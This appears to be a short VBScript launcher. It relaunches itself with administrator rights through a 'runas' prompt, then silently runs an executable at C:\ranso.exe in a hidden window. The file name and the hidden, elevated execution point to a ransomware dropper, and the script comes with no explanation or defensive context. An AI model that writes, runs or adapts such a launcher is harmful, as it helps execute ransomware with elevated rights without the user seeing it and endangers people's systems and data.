If Not WScript.Arguments.Named.Exists("elevate") Then
  CreateObject("Shell.Application").ShellExecute WScript.FullName _
    , """" & WScript.ScriptFullName & """ /elevate", "", "runas", 1
  WScript.Quit
End If
Set WshShell = WScript.CreateObject("WScript.Shell") 
WshShell.Run """C:\ranso.exe""", 0 , false 